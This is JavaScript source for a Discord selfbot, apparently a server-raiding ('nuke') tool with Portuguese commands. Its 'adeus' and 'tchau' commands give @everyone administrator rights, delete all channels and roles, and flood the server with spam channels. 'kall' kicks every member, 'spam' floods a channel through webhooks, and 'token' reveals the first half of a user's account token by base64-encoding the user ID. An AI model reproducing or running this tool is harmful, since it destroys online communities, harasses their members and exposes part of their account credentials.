const Discord = require('discord.js-selfbot');
const color = require("colors-2.0.0")
const setTitle = require("console-title")
const client = new Discord.Client();
const MessageEmbed = require('discord.js').MessageEmbed;
const config = require("./config.json");
const prefix = config.prefix;


client.on('ready', async () => {
 await console.clear()
  setTitle("♡")
  console.log(`
                                  ███╗░░██╗░█████╗░░█████╗░██████╗░██╗░░░░░███████╗
                                  ████╗░██║██╔══██╗██╔══██╗██╔══██╗██║░░░░░██╔════╝
                                  ██╔██╗██║██║░░██║██║░░██║██║░░██║██║░░░░░█████╗░░
                                  ██║╚████║██║░░██║██║░░██║██║░░██║██║░░░░░██╔══╝░░
                                  ██║░╚███║╚█████╔╝╚█████╔╝██████╔╝███████╗███████╗
                                  ╚═╝░░╚══╝░╚════╝░░╚════╝░╚═════╝░╚══════╝╚══════╝
  
  `.green)
    console.log(`                                            | Logado em ${client.user.tag} |`.red);
    console.log(`                                            | Estou em ${client.guilds.cache.size} Servidores |`.red)
    console.log(`                                            | Tenho ${client.users.cache.size} Usuários      |`.red)
});



client.on("message", async function(message) {
  if (message.author.id !== client.user.id) return;
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;

  const commandBody = message.content.slice(prefix.length);
  const args = commandBody.split(' ');
  const command = args.shift().toLowerCase();
  if(command === "help")
 {
      var av = message.author.avatarURL()
      let embed = new Discord.MessageEmbed()
      .setTitle("Comandos")
      .addField("adeus", "Realiza a destruição do servidor.")
      .addField("tchau", "Delete os cargos e canais do servidor.")
      .addField("kall", "Kick todos os membros do servidor.")
      .addField("spam", "Realiza um spam no servidor")
      .addField("token", "Descubra metade do token, do usuário")
      .addField("jogo", "Define seus status para playing")
      .addField("userinfo", "Veja informações sobre um usuário")
      .setColor(config.embed)
      .setThumbnail(av)
      .setFooter(`${config.owner}`);
      message.channel.send(embed);
      message.delete();
  }
  
  
  
  else if(command === "adeus")
  {
    message.delete();
    message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
    message.guild.channels.cache.forEach
    (channel => channel.delete());
    for (pas = 0; pas < 25; pas++)
    message.guild.channels.create
    (`${message.author.username} marcando presença..`, {
      type: 'text'
    });
    console.log(`Excluiu tudo 🚀`);
    message.guild.setName(` ${message.author.username} marcou presença`);
    console.log(`Mudou o nome do servidor 🚀`);
    var av = message.author.avatarURL()
    message.guild.setIcon(av)
    console.log(`Mudou o icon do servidor`)
    message.guild.setBanner(av)
    console.log("Mudou o banner do servidor")
  }
  
  
  
  else if(command === "spam") 
  { 
    message.delete();
    var x = message.channel
    var name = message.author.tag
    var av = message.author.avatarURL
    for (pas = 0; pas < 3; pas++) {
      x.createWebhook(name,av)
      console.log(`Webhooks criadas`)
    }
    console.log(`Estou spamando`)
    for (pas = 0; pas < 99; pas++) {
    const webhooks = await x.fetchWebhooks();
    const wb = await webhooks.first()
    wb.send(config.message)
    }
  }
   
   else if(command === "userinfo")
  {
    if(message.author.bot) return;
  let user = message.mentions.users.first() || message.author;
  let userinfo = {
    avatar: user.avatarURL(),
    name: user.username,
    discrim: `#${user.discriminator}`,
    id: user.id,
    status: user.presence.status,
    bot: user.bot,
    erstelltAm: user.createdAt,
  };

  let embed = new Discord.MessageEmbed()
  .setTitle("**Userinfo**")
  .setColor(config.embed)
  .setThumbnail(userinfo.avatar)
  .addField("**Nome do usuário**: ",userinfo.name, true)
  .addField("**Tag**: ",userinfo.discrim, true)
  .addField("**Id**: ",userinfo.id, true)
  .addField("**Status**: ",userinfo.status)
  .addField("**Bot**: ",userinfo.bot )
  .addField("**Conta criada há**: ",userinfo.erstelltAm)
  .setTimestamp()
  .setFooter(` ${message.author.username} Ta on 🚀`);

  message.channel.send(embed);
  }
  
  
  else if(command === "kall")
  {
    message.guild.members.cache.forEach(member => member.kick({ reason: "monkey D. luffy marcando presença" })
                    .then(console.log(`${member.user.tag} kickado`) && message.channel.send("kickando geral.")
                        .catch()
                    ));
                message.delete();
  }
  
  else if(command === "tchau") {
    message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
        if(message.guild.channels.cache) {
           var c = message.guild.channels.cache.forEach(channel => channel.delete());
           console.log("Canais apagados")
        }

        if(message.guild.roles.cache) {
            message.guild.roles.cache.forEach(role => role.delete());
        }
  }
  
  else if(command === "jogo") {
    message.delete();
    let msg = args.join(' ');
    client.user.setActivity(msg, {type: 'PLAYING' });
    console.log("Você está jogando" + msg);
  }
  
  else if(command === "token") {
    message.delete();
    let user = message.mentions.users.first() || client.users.cache.get(args[0]);
    if(!user) return message.channel.send('Você precisa mencionar um usuario.');
    let embed = new Discord.MessageEmbed()
    .setDescription(Buffer.from(user.id).toString("base64"))
    .setColor(config.embed)
    .setFooter(`${message.author.username} tá on 🚀`);
    message.channel.send(embed);
  }
});


client.login(config.token);

